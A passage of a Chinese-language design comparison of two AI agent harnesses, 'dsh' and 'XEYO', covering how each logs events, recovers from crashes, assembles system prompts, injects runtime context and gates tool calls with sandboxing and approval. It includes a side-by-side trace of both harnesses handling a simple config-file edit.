| 散文规范 | `dsh-prose-standard` 技能 + 禁用隐喻 + 禁用 `contract/boundary/shape` 滥用（`AGENTS.md:144`） | 引擎文本铁律（只给信息不给导演） |
| 自我约束框架 | — | **应试性审查四尺子**（R1 产品受益 / R2 无评测分支 / R3 信息纪律 / R4 收益可证伪）+ BENCH 口径登记表 |

**一个对称的发现**：dsh 有一份 `dsh-prose-standard` 技能，规定**写给模型看的技术文档**该用什么语气（禁隐喻、禁术语滥用）；XEYO 的 `AGENTS.md` 铁律规定**写给模型看的运行时文本**只许是信息。两者都在管"语言"，但一个管**人类文档**，一个管**模型注意力**。这恰好是两端第一性问题的又一次投影。

---


## 域 33 · 行为对照用例：同一任务在两端各发生什么

> 来源：**R4 枚举面·逐字段级对比** · 原节「§18 行为对照用例：同一任务在两端各发生什么」（源 L1388–1450）

##### §18 行为对照用例：同一任务在两端各发生什么

**任务**：用户说「把 `config/app.yaml` 里的 `timeout: 30` 改成 `timeout: 60`」。

###### 18.1 dsh 逐步

| 步 | 发生的事 | 依据 |
|---|---|---|
| 1 | `turn/start{turn}` | 核心事件 |
| 2 | `request/header{header:{config, system, tools}, reason:'initial'}` 落日志 | 工具面与 system 快照进日志 |
| 3 | `step/start{turn, step}` | |
| 4 | 流：`block-start(text)` → `text-delta*` → `block-end(TextBlock)` → `block-start(tool-call)` → `tool-call-delta{argumentsDelta}` × N → `block-end(ToolCallBlock)` → `usage` → `finish{tool-calls, replayState}` | `StreamChunk` 7 变体 |
| 5 | 落 `assistant/message{turn, step, message, stream, usage}` | surface 事件 |
| 6 | 落 `tool/call{callId, name:'read', arguments:'{"path":"config/app.yaml"}'}`（**原始字符串**） | |
| 7 | 执行管线：`tools/execute` → timeout 包装（读 `tool.timeoutMs`，无则跳过）→ `PreToolUse` hook → `ctx.sandbox.confine(argv, policy)`（默认 `read-only`）→ 执行 | §3.1 |
| 8 | `tools/post-execute`：repeat guard 计数 → spill 判定（超 `maxInlineBytes` 则落盘替换） | |
| 9 | 落 `tool/result{turn, step, message, meta?}`；`meta` 非 JSON 可序列化则**源头拒收** | |
| 10 | 落 `step/end`，进入下一步：**重新** 组装 system prompt 与工具列表 → `request/header`（**只有变化时才落**） | 工具面不冻结 |
| 11 | 第二次 `read` → 然后 `edit`：`PreToolUse` 对 `edit` 触发审批（策略档决定）→ 落 `approval/asked` | |
| 12 | 用户批准 → `approval/decided`；**策略句以动态 context 形式进入下一请求，事件本身不进 transcript** | |
| 13 | `edit` 执行；`fs-sandbox` 三重包含判定（词法 → `stat(bigint)` 逐级祖先 → `dev/ino` 身份） | §8.3 |
| 14 | 落 `tool/result`，`turn/end{reason:{kind:'completed'}}` | |

**关键**：模型**看得见** `approval` 的结果（工具返回了什么），但**看不见**审批策略本身。工具面每步可重算。

###### 18.2 XEYO 逐步

| 步 | 发生的事 | 依据 |
|---|---|---|
| 1 | `query_loop` 进入 `while True`；首轮 `budget.prepare_next_turn()` 通过 | `query_loop.py:796-800` |
| 2 | `_repair_unpaired_tool_calls(store, "aborted")`（**只在 submit 入口做一次**） | `:795` |
| 3 | `clear_advice()` 清轮首残留提醒；新建 `RepeatCallGuard` / `IdenticalResultFold` / `LoopLedger` / `ZeroHitTracker` | `:774-783` |
| 4 | `budget.begin_turn()`；计算 `remaining = max_turns + grace - turn_count` | `:823-828` |
| 5 | T_now 装配：`tagged` 开始累块（continue/mode/runtime_budget/…）→ `_trim_tagged_blocks` → **`append_env_notice_pair` 伪造 tool 对尾插** | §6 |
| 6 | 流：`AssistantDelta` → SSE 编码为 **OpenAI 兼容 chunk**；`ReasoningDelta` → `_xy_chunk` | §14.2 |
| 7 | `ToolCallEvent{name, input（已解析 dict）, tool_use_id, input_summary, parallel}` | |
| 8 | 权限：`evaluate_policy(name='Read', tool_input, cwd, …)` → `read_path` 分支 → `readonly_gate` → `ALLOW`；grant 层早返回 | §4.1 |
| 9 | 只读工具走 `_eligible_for_early` 预取并发；`ensure_before` 保证 rewind Before 快照就绪 | |
| 10 | 结果：`result_fold.process()` 折叠同签名同输出；`store.append(tool_result_message(...))`；发 `ToolResultEvent{…, duration_ms, spilled}` | `:1971-1983` |
| 11 | `Edit` 调用：`write_path` 分支 + `needs_read_state`（必须先 Read）+ `needs_write_store` 注入 → `WriteStore` 写路径 | |
| 12 | 若需审批：`PermissionPendingEvent{request_id, tool_name, tool_input, reason, prompt, path, expires_at, intent='confirm'}`；30s 前发 `PermissionExpiringEvent` | §5.1 |
| 13 | 用户点批准 → `/v1/permission/resolve` → `PermissionResolvedEvent{approved:True, choice='allow'}`；可选"记住"→ grant store（指纹 v2） | |
| 14 | 下一次同工具同参数 → `evaluate_policy` 的 grant 层命中 → `ALLOW / always_allow_grant`（**但 bash 复合命令不吃 grant**） | §4.1 |
| 15 | 轮末：`abort.aborted` / `over_token_budget()` / `prepare_next_turn()` 任一命中 → `StoppedEvent`；否则继续 while | `:1991-2000` |

**关键**：模型**看得见** `runtime_mode_snapshot`（审批模式告知）；工具面 `schemas_json_cache` 会话内不变（`query_loop.py:771`）；T_now 每轮重建但**尾插不改前缀字节**。

###### 18.3 同任务的行为差异清单

| 环节 | dsh | XEYO |
|---|---|---|
| 审批策略可见性 | 不可见 | 可见（T_now 块） |
| 工具参数给模型看什么 | `arguments` 原字符串 | `input` 已解析 dict |
| 工具面 | 每步可重算 | 会话内冻结（`schemas_json_cache`） |
| 逐轮易变信息 | 各插件自塞 user 消息 | T_now 20 块 + 3 层预算 + 伪造 tool 对 |
| 写盘保护 | 沙箱强制（内核级） | 引擎级（write_path + needs_read_state + WriteStore） |
| 命令分析 | 无 | bash 文本反推写目标 |
| 审批重放 | ✅ 事件溯源可重建"当时看到什么" | 靠 JSONL 直出（无 header 快照） |
| 崩溃恢复 | `interrupted` 事后补写 closer | rewind v2/v3 + 中断锚 |
| 上下文压力 | `thresholdRatio 0.8` 自动压缩 | C0/C1/C2 分档 |

---



# 卷三 · 机制设计说明（第五轮全文）

> 第五轮全文。这一轮不再按能力域切，而是按「机制」切：同一道题两端各有解法，逐机制讲设计意图、不变量、算法步骤与失败路径。

## 3.1 机制总目录

> 来源：**R5 机制面·机制设计说明** · 原节「§1 机制总目录」（源 L26–56）

##### §1 机制总目录

| # | 机制 | 侧 | 关键实现 | 一句话设计意图 |
|---|---|---|---|---|
| A-1 | 事件溯源日志 | dsh | `core/session/src/{index,surface,types}.ts` | 日志是唯一真值，模型上下文是它的**投影**（`surfaceOp` 决定投影形状） |
| A-2 | 崩溃恢复（日志闭合） | dsh | `core/session/src/repair.ts` | 崩溃尾不算数据损坏；**合成闭合事件**使其可继续 |
| A-3 | 请求纪元快照 | dsh | `core/session/src/request-header.ts`、`agent.ts:488-563` | 每次请求的 system+tools+config 逐字节记档，事后可**逐字重建** |
| A-4 | System prompt 组装 | dsh | `core/system-prompt/src/index.ts` | 有序插槽 + 作用域遮蔽 + `complete` 还原 + 专家瀑布 |
| A-5 | 运行上下文快照 | dsh | `core/agent-loop/src/runtime-context.ts` | 易变事实做成**可替换的 user 消息**（差异才发、被替换即撤销） |
| A-6 | 工具执行瀑布 | dsh | `core/tools/src/index.ts:144-199,1454-1637` | 5 个可拦截事件；调度器三段返回值决定"后置阶段还能不能改写" |
| A-7 | 工具并发调度 | dsh | `core/agent-loop/src/tool-calls.ts` | 独占=屏障，并发=滚动池；**派发可重叠，提交必按模型序** |
| A-8 | 沙箱 confine | dsh | `sandbox/sandbox/src/{index,escalation}.ts` | 单函数把政策编译成 argv；无后端**拒绝运行**（fail-closed） |
| A-9 | 压缩事务 | dsh | `compaction/compaction-basic/src/region.ts`、`compaction/src/tool-pairing.ts` | 括号事务 + 工具配对平衡 + 影子计价；压缩是 **surface replace** 不是删日志 |
| A-10 | 会话持久化（JSONL） | dsh | `session/session-persistence-jsonl/src/storage.ts` | 写后缓冲 200ms + 单写者链 + 撕裂尾修复 + 跨进程租约 |
| A-11 | 会话 fork / 继承 | dsh | `core/session/src/index.ts:451-620,887-1010` | 用 `inheritedEventCount` 一刀切开"继承的"与"我自己的" |
| B-1 | T_now 注入管线 | XEYO | `prompt/pre_llm_inject.py` | 三类块 + 预算 + 裁剪 + **登记表机器执法** |
| B-2 | env_channel 声道 | XEYO | `prompt/turn_context.py:115-160`、`prompt/t_now_strategy.py` | 伪造一对**只存在于投影**的 tool 对，把注入与用户意图结构隔离 |
| B-3 | 权限判定链 | XEYO | `permissions/policy.py:1319-1700` | 先硬拦（不可被授权穿越）再分派（按工具类别） |
| B-4 | Bash 策略 | XEYO | `permissions/bash_policy.py` | 只读白名单**正向**放行；复合命令**否定式**拒绝 |
| B-5 | 授权指纹 | XEYO | `permissions/store.py:415-490` | 身份与参数分离：指纹只哈希身份，参数永不参与 |
| B-6 | 审批挂起 | XEYO | `permissions/store.py`、`engine/permission_coordinator.py` | 风险分级 TTL + 幂等 resolve + 状态机回写 |
| B-7 | rewind v2（内容寻址） | XEYO | `rewind/{snapshot,journal,index,revision}.py` | 日志只存哈希与引用，文件体走 **SHA-256 内容寻址库** |
| B-8 | rewind v3（热路径） | XEYO | `rewind/hotpath.py` | 事件日志 + orphan 先落盘 + 崩溃标记 + 后台恢复线程 |
| B-9 | rewind 存储回收 | XEYO | `rewind/blob_gc.py` | 可达性计算 + 预算驱动 + **dry-run 永不触盘** |
| B-10 | 影子 git 与工作区指纹 | XEYO | `engine/{shadow_git,workspace_revision}.py` | 独立 `GIT_DIR` 版本化 + **只读元数据指纹**（不读内容） |
| B-11 | 写入通道 | XEYO | `engine/write_store.py` | 内容哈希 + 分片锁 + 原子替换 + 未读拒绝 |
| B-12 | 预算与收尾窗口 | XEYO | `engine/budget.py` | 多软上限**共享一个** grace 窗口；防"单轮爆发烧光余轮" |
| B-13 | 成本账本 | XEYO | `usage/{ledger,pricing,attribution}.py` | 按**真实厂商**计价 + 四桶分离 + 请求级归因 |

---


## 3.2 机制设计说明 · 全文（A-1…A-11 / B-1…B-13 / C-1…C-5）

> 来源：**R5 机制面·机制设计说明** · 原节「Part A — dsh 实现机制设计说明」（源 L57–2017）

#### Part A — dsh 实现机制设计说明

##### A-1 事件溯源日志机制：日志是唯一真值，上下文是它的投影

###### 设计意图

dsh 把"发生了什么"与"模型看到什么"**彻底分离**：

- **日志**（`Session.log: SessionEvent[]`）只追加，永不变更，是唯一真值；
- **表面**（`surface`）是日志的一个**有序子序列视图**，只包含"能产生 LLM 消息"的事件；
- **模型历史**（`deriveMessages()`）是表面按节点投影的结果。

分离的关键是一个字段：**`surfaceOp`**。每个"消息产出型"事件必须显式声明它如何加入表面（`append`）或替换表面的一段（`{op:'replace', start, end}`）。于是"压缩"这种本来会破坏只追加语义的操作，变成了**再追加一条替换事件**——日志仍是只追加的，表面却被改写了。

###### 不变量

| # | 不变量 | 强制点 |
|---|---|---|
| I1 | `seq === log.length`（从 0 连续） | `index.ts:723`；seed 校验 `:567` |
| I2 | 只有三类事件可进表面：`user/message`、`assistant/message`、`tool/result` | `surface.ts:22-26` |
| I3 | 表面型事件**必须**带 `surfaceOp`；非表面型事件**不得**带 | `surface.ts:195-218` |
| I4 | `sourceEventSeqs` 必须全部指向**更早**的 seq，无重复，且**必须覆盖全部被遮蔽节点** | `surface.ts:221-256` |
| I5 | `tool/result` 的替换只能改 `content`，其余字段必须逐字节相等 | `surface.ts:299-331` |
| I6 | 事件 `data` 必须可**无损 JSON 化**（拒绝 BigInt/函数/Map/Set/Date/负零/非有限数/稀疏数组） | `index.ts:709-716` |
| I7 | append 不可重入（发布期间再 append 抛错） | `index.ts:717-720` |

###### 算法：一次 append 的完整路径

```
append(type, data, opts)                                  index.ts:699
 ├─ snapshotJsonValue(data)  → 不可序列化即抛            :709-712
 ├─ snapshotJsonValue(surfaceMetadata) → 同上             :713-716
 ├─ 重入检查（entry.appending）                            :717-720
 ├─ deepFreeze({type, seq=log.length, time=Date.now(), data, ...meta})  :721-727
 ├─ surfaceManager.validateNext(event)  ← 只"计划"，不改状态  :728
 │    └─ planSurfaceEvent：seq 连续性 → surfaceOp 合法性 → 来源校验 → 范围定位 → tool_result 改写校验
 ├─ entry.appending = true                                 :730
 ├─ log.push(event)；eventsSnapshot 失效                    :737-738
 ├─ 同步派发 session/event（逐监听器 try/catch 隔离）        :739-741
 └─ finally: appending=false；若期间请求过 detach 则此时执行  :743-747
```

注意 **validateNext 是"两段提交"**（`surface.ts:440-448`）：候选事件先被**计划**（`planSurfaceEvent`）但不改状态，只有当它真的进入 `log` 后，`_processDelta` 才在遍历到它时**执行**该计划（`surface.ts:463-478`）。这保证"验证失败的事件不会留下半更新的表面状态"。

###### 算法：模型历史的投影

```
deriveMessages()                                          index.ts:820
 ├─ surface.nodes（当前表面 seq 序列）
 ├─ 若 replaceGeneration 变了 → 清空缓存从头重建             :824-828
 ├─ 对新增节点逐个 deriveEventMessage(event)：
 │    user/message      → event.data（原文透传）
 │    assistant/message → event.data.message，但 content 为空时返回 null :110
 │    tool/result       → event.data.message
 │    其他              → null（边界/尝试/错误都只是复现数据）:116-120
 └─ 返回 [...this.derived]（新数组，元素是共享的深冻结 Message）:840
```

**关键设计注释**（`surface.ts:94-102`）：投影层故意**不做任何加框**（不给你加 `<context>` 之类），框由**生产者**自己烤进 `content`。理由写在 deferred design note 里——投影层一旦开始加框，它就不再是"逐字节复现"，重建能力就没了。

###### 失败路径

- 验证失败 → 抛在 **append 点**，而不是落盘时（`index.ts:693-697` 注释：日志是耐久真值，坏事件必须在入日志前失败）。
- 监听器失败 → 逐监听器包含（contained），**不改变返回值、不阻断后续监听器**（`index.ts:669-668`, `invokeContainedSessionObservers`）。

###### 对照提示

XEYO 的对应物是 `~/.xeyo/sessions/<id>.jsonl`（transcript 直出）。XEYO **没有表面层**：写进 JSONL 的就是模型历史，压缩/裁剪是**在内存里对消息数组做投影**（`engine/compact.py::project`），不写回日志。这带来一个结构性后果：**XEYO 无法从日志逐字重建"模型当时看到什么"**——因为投影是即时的、不落盘的。

---

##### A-2 崩溃恢复机制：把中断的尾巴补成合法 transcript

###### 设计意图

进程被杀会留下"半个 turn"：模型已经请求了工具，但工具结果没落盘。如果直接把这个日志喂回 provider，会被拒绝（悬空 tool call）。dsh 的选择是**不删、不改**，而是**合成闭合事件**追加在后面。

注释写得很直白（`repair.ts:1-5`）：*"preserves a fully written final turn and supplies the missing tool, step, and turn boundaries needed to resume with a provider-valid transcript."*

###### 算法：`interruptedTurnClosers(events)`

```
单趟扫描日志，维护三个游标：openTurn / openStep / pendingCalls: Map<callId, {step, callSeq?}>
 ├─ turn/start  → openTurn=…，openStep=null，清空 pendingCalls   repair.ts:37-41
 ├─ turn/end    → 全部清空                                        :42-46
 ├─ step/start  → openStep=…                                      :47-49
 ├─ step/end    → 清空 pendingCalls，openStep=null                :50-53
 ├─ assistant/message → 把每个 tool-call 块记入 pendingCalls      :54-59
 ├─ tool/call   → 给对应 pendingCalls 条目补 callSeq              :61-69
 └─ tool/result → pendingCalls.delete(callId)                     :70-72

若 openTurn === null → 返回 []（日志本来就是平衡的）              :82
否则从 last.seq+1 开始合成，时间戳复用 last.time（不发明"未来时间"）:87-88
 1) 先给每个未匹配的 call 合成 tool/result（Map 插入序=transcript 序）:93-126
      started？→ 文案"已记录但结果未落盘，结果未知"（劝模型按语义决定是否重试）
      未 started？→ 文案"在记录为已开始之前就中断了，需要的话重试"
 2) 再补 step/end（若 step 仍开）                                  :130-132
 3) 最后补 turn/end，reason={kind:'interrupted'}                    :133
```

###### 设计细节（三个值得记的）

1. **两个恢复码区分"未知"与"未开始"**（`repair.ts:15-18`）：`TOOL_NOT_STARTED` 与 `TOOL_OUTCOME_UNKNOWN`。这对模型的行动语义完全不同——前者可放心重试，后者可能已有副作用。
2. **合成结果必须引用 `tool/call` 的 seq**（`sourceEventSeqs: [callSeq]`，`:124`）——这样表面不变量 I4 仍然成立，合成事件也是"合法的溯源事件"。
3. **闭合顺序不可换**（注释 `:128-129`）：step 开着时直接写 turn/end 是不变量违规，所以必须先 step/end 再 turn/end。

###### 挂载点

`AgentLoop.resumeWith` 在读盘后立刻调：`const closers = interruptedTurnClosers(persisted); if (closers.length>0) await handle.append(closers)`（`agent-loop/src/index.ts:876-879`）。注释写明职责边界：**持久化层只保证物理有效，语义修复是 agent 层的活**。

###### 对照提示

XEYO 的对应物是 `engine/turn_snapshot.py`（`.turn.json` 快照，含 `status/incomplete_tool_uses/active_agent_ids/waiting_permission`）——**它是状态记录，不是日志修复**。XEYO 恢复的是"我该不该继续"，dsh 修复的是"日志能不能被 provider 接受"。两者不在同一层。另外 XEYO 有 `_repair_unpaired_tool_calls`（在 submit 入口执行一次），思路接近但**不是从持久日志反推**，而是在组装请求时修。

---

##### A-3 请求纪元快照机制：让"模型当时看到什么"可逐字重建

###### 设计意图

`deriveMessages()` 能重建**消息**，但重建不出**system prompt 与 tools**。而压缩、缓存、问题复现全都要这两样。dsh 的解法是把每次请求的 system + tools + config 做成一条日志事件：`request/header`。

注释（`request-header.ts:1-6`）：*"Anyone holding a session log reconstructs the EpochHeader any request was built under by taking the latest canonical snapshot."*

###### 数据结构与规范化

`canonicalHeader()`（`request-header.ts:21-31`）做一件事：**空的东西变成"不存在"**——空 system、空 tools 一律删除字段，`adapterDefaults` 只有在真的标记了覆盖时才保留。理由：记录、折叠、比较必须用**同一个表示**，否则"字段存在但为空"和"字段不存在"会被判为不同，产生假的 header 变更。

`headerEquals()`（`:44-54`）逐字段比：config（用 `callConfigEquals`）、`adapterDefaults` 两个标记、`system` 字符串、tools 数组**按位逐 JSON 比较**（`sameSchema`，`:34-36`）。

###### 算法：什么时候写 header 事件

`buildRequest` 里的判定链（`agent.ts:548-563`）：

```
startsSeries = startsRequestSeries || (上次请求的 surfaceGeneration !== 当前)
if (!requestHeaderLogged)                      → append(reason = baseline===undefined ? 'initial' : 'resume')
else if (baseline===undefined || !headerEquals(baseline, header)) → append(reason='change', 可能带 startsSeries:true)
else if (startsSeries)                         → append(reason='series')
else                                           → 不写
```

三种 reason 各有含义：`initial/resume` 是纪元起点；`change` 是内容真的变了（**KV 缓存前缀在这里断**）；`series` 是内容没变但表面被改过（例如压缩 replace 之后需要重新确认请求序列起点）。

同步还有 `request/context`（`:565-576`）：provider/model/contextWindow 变了才写——这是给 token 计量用的路由元数据。

###### 折叠与读取

`foldRequestHeader(events, from?)`（`request-header.ts:65-71`）是一个**纯离线折叠**：扫一遍日志，取最后一个 `request/header`。同时 `Session` 侧有**增量版**（`index.ts:764-774`），用 `headerFoldSeq` 记录已折叠到哪，每步只处理新事件，代价 O(新增)。

###### 设计取舍（注释原文值得引）

- header 折叠结果 **deepFreeze**，注释（`index.ts:766-769`）：*"a consumer mutating it in place (instead of building a replacement) would desync every later comparison against the log, so mutation throws instead."* —— 防的不是恶意，是**别名共享导致的静默失同步**。
- `requestProposal()`（`agent.ts:61-67`）：把 adapter 推导出来的 `reasoningEffort`/`maxTokens` 从"下一轮提案"里删掉，只留用户/插件真正声明的，否则推导值会被当成"用户要求"固化下来。

###### 对照提示

XEYO **完全没有对应物**。XEYO 的 system prompt 由 `python/prompt/system_prompt.py` 每轮拼装，**拼完即用、不落档**；T_now 块只在内存投影层存在。这意味着 XEYO 事后无法回答"第 37 轮那次请求，system prompt 到底长什么样"。这是 dsh 相对 XEYO **最硬的一处结构性领先**，也是第二轮/第三轮反复指出的"缺一层"的具体形态。

---

##### A-4 System Prompt 组装机制：有序插槽 + 作用域遮蔽 + complete 还原

###### 设计意图

system prompt 不是字符串模板，而是一个**注册表**：各插件往注册表里放"片段"，组装时按 `order` 排序拼接。目的有二：①插件可以增删自己的片段而不动别人的；②排序是**确定性**的（`order` 相同则按名字 code-unit 比较），跨机器结果一致。

###### 三个注册面 + 一个保留语义

| 面 | 注册 API | 排序 | 注入位置 |
|---|---|---|---|
| sections | `systemPrompt.section()` | `order` 升序 → 名字 | system prompt 正文，`\n\n` 连接 |
| contexts | `systemPrompt.context()` | `order` 升序 | **作为 user 消息**（运行上下文快照，见 A-5） |
| tools | `systemPrompt.tools()` | canonical 排序（或 `toolOrder`） | 请求的 tools 数组 |
| variables | `systemPrompt.variable()` | — | `{{name}}` 插值（严格：未注册/无值即抛） |

**顺序是集中分配的**（`index.ts:121-152` 的 `SECTION_ORDERS`）：`HARNESS_IDENTITY(-1000)` → `HARNESS_SOURCE(-900)` → … → 每个工具自己的说明（`TOOL_BASH=1000`、`TOOL_READ=1100` …）→ `TOOLS_SDK(5000)` → `STRUCTURED_OUTPUT(9900)`。`CONTEXT_ORDERS`（`:157-161`）只有三个：`SANDBOX_POLICY=110`、`APPROVAL_POLICY=115`、`SUBAGENT_DELEGATION=120`。

**注意 115 与 110 的相邻**：审批策略紧挨沙箱策略——因为在模型看来它们是同一类事实（"我这个执行环境被限制到什么程度"）。

###### 不变量

| # | 不变量 | 强制点 |
|---|---|---|
| I1 | 同一层内片段名不得重复（重名抛错，且错误文案区分"全局重名"与"作用域内重名"） | `index.ts:366-376` |
| I2 | `order` 必须有限数 | `:433-435`, `:468-470` |
| I3 | 至多一个 `complete` 片段；多于一个组装失败 | `:574-577` |
| I4 | `toolOrder` 必须**恰好一次**含 `TOOL_ORDER_REST` 标记 | `:187-198` |
| I5 | `toolOrder` 中的未知名字在组装期失败 | `:211-214` |
| I6 | 变量名必须匹配 `^[a-z][a-z0-9_]*$`；引用未注册变量抛错；`{{}}` 走 malformed 路径 | `:309-346` |
| I7 | 变量解析**不做二次扫描**（插值结果里的 `{{...}}` 不会被再解释） | `:343` 注释 |

###### 作用域遮蔽（ScopedLayers）

`assemble()`（`:536-611`）的合并顺序：

```
变量：先全局，再按作用域链"从远到近"覆盖 → 最近的赢                :542-551
片段/上下文：merge(scope, layer=>layer.sections) —— 同名的 scoped 遮蔽 global  :553-554
工具：全局 provider + 作用域链上所有 provider **都参与**（工具是累加不是遮蔽）    :556-559
```

工具与片段的合并语义**故意不同**：片段是"同一块内容的替换关系"，工具是"能力集合的累加关系"。

###### 协作瀑布与 complete 还原

组装完成后跑 `system-prompt/assemble` 瀑布（`:601-604`），监听器可以整体改写 assembly。但**如果注册了 complete 片段**，瀑布跑完之后会把 sections **还原成那一个片段**（`:605-610`）。注释（`:69-71`）：之所以还要跑瀑布，是因为 tools/contexts/variables 仍需要被解析。

###### 渲染期的严格性

`renderPrompt`（`:263-268`）：逐片段插值 → **丢弃空片段** → `\n\n` 连接。`interpolate`（`:309-346`）对畸形引用（`{{` 后面还有 `}}` 但没有合法名字）**抛错**；但孤立的 `{{` 没有后续 `}}` 时当**普通文本**（`:319-326`）。注释解释了原因：误报比漏报更伤——散文里出现 `{{` 是合法的。

###### 对照提示

XEYO 的 system prompt 是 `python/prompt/system_prompt.py` 单文件拼装，**没有插槽注册机制**，因此第三方无法增删片段；易变内容一律走 T_now 注入管线（这反而是 XEYO 设计上更克制的地方——它把"能改 system prompt"的口子彻底关掉了）。

两端的取舍正好相反：dsh 要**可替换性**（所以开注册面），XEYO 要**前缀稳定性**（所以关注册面）。这就是第二轮说的"镜像"关系在 prompt 层的具体体现。

---

##### A-5 运行上下文快照机制：让"易变事实"既进上下文又不破坏缓存

###### 设计意图

有一类事实每轮都可能变：沙箱策略、审批策略、委派策略。它们必须让模型知道，但**不能进 system prompt**——因为 system prompt 在最前面，改一个字就毁掉整个 KV 前缀缓存。

dsh 的解法（`runtime-context.ts`）很巧：把这类事实做成**一条可被替换的 user 消息**。

- 它是 user 角色 → 位置在历史**尾部附近**，改动不影响前面的前缀；
- 它可以被**替换** → 用 surface 的 `replace` 操作换掉旧版本，而不是无限追加；
- 它**只在内容真的变了**才发 → 相同内容重复组装不产生新事件。

###### 数据结构

```ts
class RuntimeContextProjection {
  private retained: { seq; text } | null | undefined
  //  undefined = 从未有过快照；null = 有过但当前没有保留
}
```

三种状态是刻意的：`undefined` vs `null` 区分了"首次组装"与"快照已被压缩替换掉"，`project()` 的首行判断依赖这个区分（`:65`）。

###### 算法

**构造期（从日志恢复）**（`:34-44`）：从日志末尾往前扫，找**最后一个属于本插件**（`source.kind==='plugin' && plugin==='@deepseek-ai/dsh-system-prompt'`）且**仍在当前表面上**的 `user/message`，认作当前保留值。注意"仍在表面上"这个条件——被压缩替换掉的旧快照不算数。

**运行期（跟随事件）**（`:46-55`）：
```
session/event:
  ├─ user/message 且是本插件产的 → retained = {seq, text}
  └─ 是替换型表面事件 且 sourceEventSeqs 包含 retained.seq → retained = null
```

**投影决策**（`:64-75`）：
```
if (retained === undefined && current === '')      → 不发（从未有过、现在也没有）
snapshot = current==='' ? CLEARED : current         ← 清空也必须发一条"清空声明"
if (retained?.text === snapshot)                   → 不发（内容没变）
否则 → 生成 user 消息，source 带 sections 归因
```

###### 三个设计细节

1. **清空也要发消息**（`:13`）：`CLEARED = 'Current runtime context: none. Earlier runtime-context snapshots no longer apply.'` —— 否则模型会继续按上一轮的策略行动。这是"信息正确性"问题，不是"节省 token"问题。
2. **归因随消息走**（`:70-73`）：`source.sections` 保留"这段快照由哪几块拼成"，供 UI 归因展示——但注释强调**不能重新切分 joined 文本**（`system-prompt/index.ts:296-301`），所以 sections 是原样带下来的，不是事后解析的。
3. **快照文本带头**（`system-prompt/index.ts:290`）：`'Current runtime context. This snapshot supersedes earlier runtime-context snapshots.'` —— 显式声明"我取代之前的"，避免模型把新旧两份当叠加。

###### 对照提示

**这是 XEYO 与 dsh 最接近、又最不同的一处。**

| | dsh | XEYO |
|---|---|---|
| 机制名 | 运行上下文快照 | T_now 注入 |
| 载体 | **一条可替换的 user 消息** | **一对伪造的 tool_use/tool_result**（env_channel）或尾插 user（legacy） |
| 变更方式 | surface `replace`（旧版本真的从历史消失） | 每轮重新投影（旧版本本来就不在持久历史里） |
| 是否落日志 | **是**（是正常 session 事件） | **否**（投影-only，绝不进 MessageStore/JSONL） |
| 相同点 | 都在尾部、都"变了才发"、都避免动 system prompt | 同 |

一句话：**dsh 的上下文是"日志里的一条可替换记录"，XEYO 的上下文是"从不落地的投影"。** 前者可复现，后者更纯净但不可复现。

---

##### A-6 工具执行瀑布机制：5 个可拦截点 + 三段返回值

###### 设计意图

dsh 的 tool call 执行不是"调用函数"，而是一条**可被第三方逐段拦截的瀑布**。每个阶段都是独立的 waterfall 事件，插件可以改写决策或结果。

###### 5 个拦截点（事件声明见 `core/tools/src/index.ts:144-199`）

| 事件 | 模式 | 时机 | 能做什么 |
|---|---|---|---|
| `tools/pre-execute` | waterfall | 参数物化之后、派发之前 | 返回 `allow / ask / deny` 决策 |
| `tools/execute` | waterfall | 包裹工具体（around） | 完全替换执行（可换 signal、可换结果） |
| `tools/post-execute` | waterfall | 结果产生后 | 可替换 `value` 或 `content`（有约束） |
| `tools/result` | emit | 结果定型后 | 只通知（**不能改结果**，逐监听器隔离） |
| `tools/change` | emit | 注册表变化 | 通知（prompt 重算据此类事件） |

###### 三段返回值：为什么需要三态

调度器接口（`:444-453`）：

```ts
prepare(exec) → { kind:'dispatch'; exec }
              | { kind:'post-result'; exec; result }   ← 还要跑 post-execute
              | { kind:'final-result'; exec; result }  ← 跳过 post-execute

dispatch(exec) → { kind:'post-result'; result } | { kind:'final-result'; result }
```

三态的语义差别就是注释说的那句话（`:420-422`）：**"A `post-result` still receives post-execute; a `final-result` bypasses it."**

为什么要在**prepare 阶段**就区分？因为某些结果是在前置阶段产生的（例如被 who 在 pre-execute 里 deny 了、工具不存在、参数非法），这些结果**不应该再走 post-execute**——否则一个"被拒绝的调用"还会经过结果改写管线，第三方插件可能把它"改写成功"。

###### 算法：`prepareExecution` 的判定顺序（`:1454-1498`）

```
createExecution(input)                                    :1355
 ├─ 名称解析（get(name, agent)）+ 折叠判定（collapses）      :1371-1372
 ├─ 快照 arguments（必须无损 JSON，否则 final-result）        :1403-1406
 ├─ 记录 contentFinalizers / cancellationStates             :1409-1413
 ├─ 若被折叠（ptc 模式下只允许 run_code）→ final-result      :1414-1434
 └─ 否则 kind:'ready'

prepareExecution 主体：
 ├─ 调用方已取消？→ final-result(ABORTED_BEFORE_DISPATCH)   :1461-1463
 ├─ await waterfall('tools/pre-execute', exec)              :1466-1469
 ├─ gate.kind==='ask' → serviceAsk()（走审批 seam）          :1470-1472
 ├─ 取消 && 审批被取消 → post-result(aborted)                :1474-1476
 ├─ denialReason = allow ? guardReason(exec) : decision.reason
 │    ← 注意：guard 只在 allow 之后跑，deny 理由优先于 guard    :1477-1479
 ├─ denialReason 存在 → post-result（错误结果）               :1480-1490
 ├─ 再次检查取消 → post-result(aborted)                      :1491-1493
 └─ kind:'dispatch'                                        :1494
```

###### 三处值得记的设计

1. **折叠调用在策略管线**之前**终止**（`:1364-1370` 注释原文）：*"pre-execute listeners, approval `ask`, and guards must never observe — or worse, approve — a call that can only fail."* —— 不给"能被批准但必然失败"的调用任何被批准的机会。
2. **`finishScheduledExecution` 的双层 try/catch**（`:1622-1637`）：先物化结果（失败则转错误结果），再做工具自有内容变换（失败则转错误结果），最后**才**通知。注释（`:1647-1648`）：通知时把 exec **冻结**——防止观察者改掉注册表的活对象。
3. **取消结果的语义由"工具体是否已开始"决定**（`:1508-1516`）：`bodyInvoked ? ABORTED : ABORTED_BEFORE_DISPATCH`。两个不同错误码让模型能区分"可能已有副作用"与"肯定没跑"。

###### 对照提示

XEYO 的工具执行链在 `engine/query_loop.py` 内联完成，**扩展点为 0**（没有对应 `tools/pre-execute` 这类事件）。XEYO 的可拦截性靠"工具实现内部调 policy"，即**每个工具自己调用权限判定**，而不是有一个统一的管线钩子。这就是第三轮说的"dsh 是层，XEYO 是函数或约定"。

---

##### A-7 工具并发调度机制：派发可重叠，提交必按模型序

###### 设计意图

